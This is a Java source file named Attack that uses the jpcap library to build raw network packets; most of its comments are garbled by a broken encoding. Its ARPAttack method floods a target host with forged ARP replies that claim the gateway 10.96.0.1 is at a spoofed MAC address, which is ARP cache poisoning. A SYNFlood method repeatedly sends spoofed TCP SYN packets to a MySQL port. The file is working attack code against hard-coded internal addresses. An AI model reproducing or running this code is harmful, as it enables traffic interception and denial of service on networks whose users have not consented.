package com.jiangnan.arpattact.test;


import jpcap.*;
import jpcap.JpcapCaptor;
import jpcap.JpcapSender;
import jpcap.NetworkInterface;
import jpcap.packet.ARPPacket;
import jpcap.packet.EthernetPacket;
import jpcap.packet.Packet;
import jpcap.packet.TCPPacket;

import java.io.IOException;
import java.net.InetAddress;
import java.util.Arrays;

public class Attack {
	/*public static void main(String[] args) throws java.io.IOException {
		JpcapSender sender=JpcapSender.openDevice(Jpcap.getDeviceList()[2]);
		//build packet
		IPPacket ipp= new IPPacket(); 
		ipp.setIPv4Parameter(0,false,false,false,0,false,false,false,0,0,255,
		230, //230δ����Э��
		new IPAddress("110.110.17.101"),
		new IPAddress("10.96.77.173"));
		ipp.data="0101011101".getBytes();
		//send packet
		while(true) {
			sender.sendPacket(ipp); 
			System.out.println("OK");
		}
	}*/
	static NetworkInterface[] devices = JpcapCaptor.getDeviceList();//�õ�����A�������豸�б�
	
	@SuppressWarnings("unused")
	static byte[] getOtherMAC(String ip) throws IOException{
		JpcapCaptor jc = JpcapCaptor.openDevice(devices[0],2000,false,3000);
		JpcapSender sender = jc.getJpcapSenderInstance();
		InetAddress senderIP = InetAddress.getByName("10.96.33.232");	//����A��IP��ַ
		InetAddress targetIP = InetAddress.getByName(ip);				//Ŀ��������IP��ַ
		byte[] broadcast=new byte[]{(byte)255,(byte)255,(byte)255,(byte)255,(byte)255,(byte)255};	//�㲥��ַ
		ARPPacket arp=new ARPPacket();	//��ʼ����һ��ARP��
		arp.hardtype=ARPPacket.HARDTYPE_ETHER;		//Ӳ������
		arp.prototype=ARPPacket.PROTOTYPE_IP;		//Э������
		arp.operation=ARPPacket.ARP_REQUEST;                      //ָ����ARP�����
		arp.hlen=6;	//�����ַ����
		arp.plen=4;	//Э���ַ����
		arp.sender_hardaddr=devices[0].mac_address;		//ARP���ķ��Ͷ���̫����ַ	//Դ�����ַ
		arp.sender_protoaddr=senderIP.getAddress();     //���Ͷ�IP��ַ	ԴIP��ַ
		arp.target_hardaddr=broadcast;		//Ŀ�Ķ���̫����ַ	
		arp.target_protoaddr=targetIP.getAddress();	//Ŀ�Ķ�IP��ַ
		
		//��װ��������·���֡
		EthernetPacket ether=new EthernetPacket();	//������̫���ײ�
		ether.frametype=EthernetPacket.ETHERTYPE_ARP;               //֡����
		ether.src_mac=devices[0].mac_address;	//��̫��Դ��ַ
		ether.dst_mac=broadcast;                                                      //��̫��Ŀ�ĵ�ַ
		arp.datalink=ether;
		
		sender.sendPacket(arp);	//send
		
		while(true){                                                //��ȡARP�ظ�����������ȡ��Ŀ��������MAC��ַ
		   Packet packet = jc.getPacket();
		   if(packet instanceof ARPPacket){
			   ARPPacket p=(ARPPacket)packet;
			   if(p==null){
				   throw new IllegalArgumentException(targetIP+" is not a local address");
			   }
			   if(Arrays.equals(p.target_protoaddr,senderIP.getAddress())){
				   System.out.println("get mac ok");
				   return p.sender_hardaddr;
			   }
		   }
			
		}
		
		
	}
	
	static byte[] stomac(String s) {  
        byte[] mac = new byte[] { (byte) 0x00, (byte) 0x00, (byte) 0x00, (byte) 0x00, (byte) 0x00, (byte) 0x00 };  
        String[] s1 = s.split("-");  
        for (int x = 0; x < s1.length; x++) {  
            mac[x] = (byte) ((Integer.parseInt(s1[x], 16)) & 0xff);  
        }  
        return mac;  
    }
	
	static String macToString(byte[] s){
		String mac = "";
		System.out.println("BEGIN MAC TO STRING������");
		for (int i = 0; i < s.length; i++){
			String temp = Integer.toHexString(s[i] & 0xff);
			if(temp.length() == 1) temp = "0" + temp;	//��0
			mac += temp;
		}
		System.out.println("MAC TO STRING SUCCESSFULLY");
		return mac;
	}
	
	static String ipToString(byte[] s){
		String ip = "";
		for (int i = 0; i < s.length; i++){
			String temp = Integer.toString(s[i] & 0xff);
			if(temp.length() == 1) temp = "0" + temp;	//��0
			ip += temp;
		}
		return ip;
	}
	
	@SuppressWarnings("restriction")
	public static void ARPAttack(String ip) throws InterruptedException, IOException{
		JpcapCaptor jpcap = JpcapCaptor.openDevice(JpcapCaptor.getDeviceList()[0], 65535, false, 3000);
		jpcap.setFilter("arp", true);
		JpcapSender sender = JpcapSender.openDevice(JpcapCaptor.getDeviceList()[0]);
		
		
		ARPPacket arp = new ARPPacket();
		arp.hardtype = ARPPacket.HARDTYPE_ETHER;
		arp.prototype = ARPPacket.PROTOTYPE_IP;
		arp.operation = ARPPacket.ARP_REPLY;	//ָ����ARP_REPLY�ظ���
		arp.hlen = 6;
		arp.plen = 4;
		
		//System.out.println(getWindowsMACAddress());
		
		byte[] srcmac = stomac("00-1C-23-2E-A7-0A"); // �ٵ�MAC����
		//arp.sender_hardaddr = devices[0].mac_address;
		//arp.sender_hardaddr = getOtherMAC("10.96.78.130");
		arp.sender_hardaddr = srcmac;
		//System.out.println(arp.sender_hardaddr);
		//System.out.println(macToString(arp.sender_hardaddr));
		arp.sender_protoaddr = InetAddress.getByName("10.96.0.1").getAddress();
		
		arp.target_hardaddr=getOtherMAC(ip);
		//arp.target_hardaddr="AAAAAAAAAAAA".getBytes();
		arp.target_protoaddr=InetAddress.getByName(ip).getAddress();
		
		System.out.println(macToString(getOtherMAC(ip)));
		
		//����DLC֡
		EthernetPacket ether=new EthernetPacket();
		ether.frametype=EthernetPacket.ETHERTYPE_ARP;
		ether.src_mac= srcmac;	//getOtherMAC("10.96.0.1");
		//ether.src_mac = "B888AAAABBCC".getBytes();
		ether.dst_mac=getOtherMAC(ip);
		//ether.dst_mac = "AAAAAAAAAAAA".getBytes();
		arp.datalink=ether;
		
		//sender.sendPacket(arp);
		//System.out.println("OK");
		// ����ARPӦ���   
        while (true) {  
            System.out.println("sending ARP..");  
            sender.sendPacket(arp);  
            Thread.sleep(2 * 1000);  
        }
	}
	
	public static void SYNFlood() throws IOException, InterruptedException{
		JpcapCaptor jpcap = JpcapCaptor.openDevice(JpcapCaptor.getDeviceList()[0], 65535, false, 3000);
		jpcap.setFilter("tcp", true);
		JpcapSender sender = JpcapSender.openDevice(JpcapCaptor.getDeviceList()[0]);
		
		TCPPacket tcp = new TCPPacket(6000, 3306, 0, 1, false, false, false, false, true, false, false, false, 0, 0);
		//����DLC֡
		byte[] srcmac = stomac("00-1C-23-2E-A7-0A"); // �ٵ�MAC����
		EthernetPacket ether=new EthernetPacket();
		ether.frametype=EthernetPacket.ETHERTYPE_ARP;
		ether.src_mac= srcmac;	//getOtherMAC("10.96.0.1");
		//ether.src_mac = "B888AAAABBCC".getBytes();
		ether.dst_mac=getOtherMAC("10.96.77.173");
		//ether.dst_mac = "AAAAAAAAAAAA".getBytes();
		tcp.datalink=ether;
		
		while (true) {  
            System.out.println("sending SYN TCP..");  
            sender.sendPacket(tcp);  
            Thread.sleep(2 * 1000);
        }
		
	}
	
	public static void findPC(String localhost) throws IOException{
		
		JpcapCaptor jc = JpcapCaptor.openDevice(devices[0],2000,false,3000);
		JpcapSender sender = jc.getJpcapSenderInstance();
		InetAddress senderIP = InetAddress.getByName(localhost);	//����A��IP��ַ
		InetAddress targetIP = InetAddress.getByName("10.96.0.1");				//Ŀ��������IP��ַ
		byte[] broadcast=new byte[]{(byte)255,(byte)255,(byte)255,(byte)255,(byte)255,(byte)255};	//�㲥��ַ
		ARPPacket arp=new ARPPacket();	//��ʼ����һ��ARP��
		arp.hardtype=ARPPacket.HARDTYPE_ETHER;		//Ӳ������
		arp.prototype=ARPPacket.PROTOTYPE_IP;		//Э������
		arp.operation=ARPPacket.ARP_REQUEST;                      //ָ����ARP�����
		arp.hlen=6;	//�����ַ����
		arp.plen=4;	//Э���ַ����
		arp.sender_hardaddr=devices[0].mac_address;		//ARP���ķ��Ͷ���̫����ַ	//Դ�����ַ
		arp.sender_protoaddr=senderIP.getAddress();     //���Ͷ�IP��ַ	ԴIP��ַ
		arp.target_hardaddr=broadcast;		//Ŀ�Ķ���̫����ַ	
		arp.target_protoaddr=targetIP.getAddress();	//Ŀ�Ķ�IP��ַ
		
		//��װ��������·���֡
		EthernetPacket ether=new EthernetPacket();	//������̫���ײ�
		ether.frametype=EthernetPacket.ETHERTYPE_ARP;               //֡����
		ether.src_mac=devices[0].mac_address;	//��̫��Դ��ַ
		ether.dst_mac=broadcast;                                                      //��̫��Ŀ�ĵ�ַ
		arp.datalink=ether;
		
		sender.sendPacket(arp);	//send
		Thread t = new Thread(new AcceptThread(senderIP, jc));
		t.start();
	}
	
	public static void main(String[] args) throws IOException, InterruptedException{
		ARPAttack("10.96.91.56");
		/*JFrame frame = new JFrame("");
		frame.setBounds(300, 250, 400, 300);
		Container c = frame.getContentPane();
		c.setLayout(null);
		JTextField targetIP = new JTextField("10101010");
		targetIP.setBounds(10,10,80,15);
		
		JButton atk = new JButton("ARP��������");
		atk.setBounds(100, 10, 25, 15);
		atk.addActionListener(new ActionListener(){
			@Override
			public void actionPerformed(ActionEvent e) {
				new Thread(new Runnable(){
					@Override
					public void run() {
						try {
							ARPAttack("10.96.91.56");
						} catch (InterruptedException e) {
							e.printStackTrace();
						} catch (IOException e) {
							e.printStackTrace();
						}
					}
				}).start();
			}
			
		});
		
		c.add(targetIP);
		c.add(atk);
		frame.show();*/
		
		
		 //SYNFlood();
		//System.out.println(Attack.macToString(getOtherMAC("10.96.77.173")));
		//findPC("10.96.102.218");
	}
	
	
	
}
